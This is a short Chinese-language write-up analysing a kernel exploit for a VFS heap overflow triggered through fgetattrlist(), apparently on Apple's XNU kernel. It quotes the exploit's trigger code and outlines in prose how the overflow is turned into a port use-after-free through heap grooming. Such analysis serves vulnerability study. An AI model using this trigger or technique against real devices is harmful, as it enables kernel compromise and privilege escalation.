# vfs溢出

## Getattrlist

getattrlist()函数返回文件系统对象的属性（即元数据）。getattrlist()函数用在文件是路径时，而fgetattrlist()则用在文件是文件描述符时。

除了路径是相对路径时，系统调用getattrlistat()等价于getattrlist()。路径是相对路径时，返回相对于文件描述符（而非当前工作路径）的path路径的属性。如果getattrlistat()的fd参数是AT_FDCWD，使用的是当前工作目录，此时与调用getattrlist()效果一致。


int fgetattrlist(int fd, struct attrlist *attrList, void * attrBuf, size_t attrBufSize,unsigned long options);

 
 
 ## exp分析
 
 ```
 static void do_vfs_overflow()
{
    int options = 0;
    int err = fgetattrlist(vfs_fd, &al, attrBuf, attrBufSize, options);
    //LOG("err: %d", err);
}
 ```
可以看到，程序是用了这个函数进行溢出

程序溢出是在kmalloc16中，查看attrBufSize大小
```

static int vfs_fd = -1;
static struct attrlist al = { 0 };
static size_t attrBufSize = 16;
static void* attrBuf = NULL;
static void prepare_vfs_overflow()
{

    vfs_fd = open("/", O_RDONLY);
    if (vfs_fd == -1) {
        perror("unable to open fs root\n");
        return;
    }

    al.bitmapcount = ATTR_BIT_MAP_COUNT;
    al.volattr = 0xfff;
    al.commonattr = ATTR_CMN_RETURNED_ATTRS;

    attrBuf = malloc(attrBufSize);
}
```
刚好16，也就是说程序没有检查最小大小，导致溢出了8个0
作者貌似将kmalloc16与port页面紧贴在一起然后，通过溢出改写port的refer构造uaf
然后通过active进行检测是否正确

最后通过gc将数据变为pipe，修改port数据构造利用

具体用了很多堆排布，我就不具体分析了
